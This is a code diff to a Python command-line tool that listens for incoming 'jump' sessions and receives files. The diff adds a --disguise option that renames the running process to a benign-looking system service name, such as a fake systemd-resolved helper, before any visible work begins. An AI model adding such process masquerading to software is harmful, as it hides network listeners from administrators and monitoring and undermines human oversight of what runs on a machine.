@@ -99,6 +99,10 @@ def _maybe_restore_files(session: JumpSession, mode: str) -> None:
 
 def cmd_listen(args):
     """Start a jump listener, waiting for incoming sessions."""
+    if getattr(args, "disguise", None):
+        from matrix.disguise import ProcessDisguise
+        ProcessDisguise(title=args.disguise).apply()
+
     restore_mode = args.restore_files
 
     def on_session(session: JumpSession):
@@ -435,6 +439,9 @@ def main():
     parser.add_argument("--require-identity", action="store_true",
                         help="Require the peer to present a verified identity "
                              "(defeats MITM on the key exchange)")
+    parser.add_argument("--disguise", type=str, default=None, metavar="TITLE",
+                        help="Set process title to a benign service name at startup "
+                             "(e.g. /usr/lib/systemd/systemd-resolved-helper)")
 
     sub = parser.add_subparsers(dest="command", required=True)
 
@@ -445,6 +452,13 @@ def main():
         choices=["ask", "always", "never"],
         default="ask",
         help="Restore received files policy (default: ask)",
+    )
+    p_listen.add_argument(
+        "--disguise",
+        type=str,
+        default=None,
+        metavar="TITLE",
+        help="Set process title to a benign service name at startup",
     )
 
     # discover
@@ -543,6 +557,11 @@ def main():
     )
 
     args = parser.parse_args()
+
+    # Apply runtime process disguise before any visible work begins
+    if args.disguise:
+        from matrix.disguise import ProcessDisguise
+        ProcessDisguise(title=args.disguise).apply()
 
     # Validate port range
     if not (1 <= args.port <= 65535):
